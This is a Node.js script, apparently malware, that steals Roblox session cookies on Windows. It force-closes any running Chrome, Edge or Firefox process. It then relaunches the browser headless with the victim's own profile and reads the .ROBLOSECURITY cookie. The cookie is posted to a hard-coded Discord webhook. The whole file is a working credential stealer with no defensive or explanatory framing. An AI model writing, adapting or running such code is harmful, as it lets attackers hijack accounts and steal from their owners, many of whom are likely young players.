const puppeteer = require('puppeteer');
const {
    execSync
} = require('child_process');
const fs = require('fs');
const os = require('os');

const fetch = (...args) => import('node-fetch').then(({
    default: fetch
}) => fetch(...args));
const username = os.userInfo().username;

function isBrowserInstalled(browserPath) {
    return fs.existsSync(browserPath);
}

function isBrowserRunning(browserName) {
    try {
        execSync(`tasklist /FI "IMAGENAME eq ${browserName}.exe"`, {
            stdio: 'ignore'
        });
        return true;
    } catch {
        return false;
    }
}

function killBrowserProcess(browserName) {
    if (isBrowserRunning(browserName)) {
        try {
            execSync(`taskkill /IM ${browserName}.exe /F`);
        } catch {}
    }
}

const browserPaths = [{
        name: 'chrome',
        path: `C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe`,
        product: 'chrome',
        userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Google\\Chrome\\User Data`,
    },
    {
        name: 'msedge',
        path: `C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe`,
        product: 'chrome',
        userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Microsoft\\Edge\\User Data`,
    },
    {
        name: 'firefox',
        path: `C:\\Program Files\\Mozilla Firefox\\firefox.exe`,
        product: 'firefox',
        userDataDir: '',
    },
];

async function tryPuppeteer(browserConfig) {
    let browser;
    try {
        browser = await puppeteer.launch({
            executablePath: browserConfig.path,
            product: browserConfig.product,
            headless: true,
            userDataDir: browserConfig.userDataDir || undefined,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu'],
            ignoreDefaultArgs: ['--enable-logging', '--v=1'],
            dumpio: false,
        });

        const page = await browser.newPage();
        await page.goto('https://www.roblox.com', {
            waitUntil: 'domcontentloaded'
        });

        const cookies = await page.cookies('https://www.roblox.com');
        const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');

        if (!robloxCookie || !robloxCookie.value) {
            console.error('Failed to retrieve .ROBLOSECURITY cookie.');
            return false;
        }

        console.log(`.ROBLOSECURITY cookie: ${robloxCookie.value}`);
        await sendWebhook(robloxCookie.value);

        return true;
    } catch (err) {
        console.error('Error during Puppeteer operation:', err);
        return false;
    } finally {
        if (browser) await browser.close();
    }
}

async function sendWebhook(cookieValue) {
    const webhookUrl = 'https://discord.com/api/webhooks/1382302958133313536/4cGNl4RIM-t9AMyKz6VRuY6mtOtg5_cbtXlE_Xi_9CeP_efp9kCoiLiu5ICJsfFYJqrK';

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: `.ROBLOSECURITY cookie:\n\`\`\`${cookieValue}\`\`\``
            }),
        });

        if (!response.ok) {
            console.error('Failed to send webhook:', response.statusText);
        } else {
            console.log('Webhook sent successfully');
        }
    } catch (err) {
        console.error('Error sending webhook:', err);
    }
}

(async () => {
    let triedAny = false;

    for (const browser of browserPaths) {
        if (!isBrowserInstalled(browser.path)) {
            continue;
        }

        triedAny = true;
        killBrowserProcess(browser.name);
        const success = await tryPuppeteer(browser);
        if (success) {
            console.log(`Successfully retrieved .ROBLOSECURITY cookie from ${browser.name}`);
            break;
        }
    }

    if (!triedAny) {
        console.log('No supported browsers found or they were not running.');
    }
})();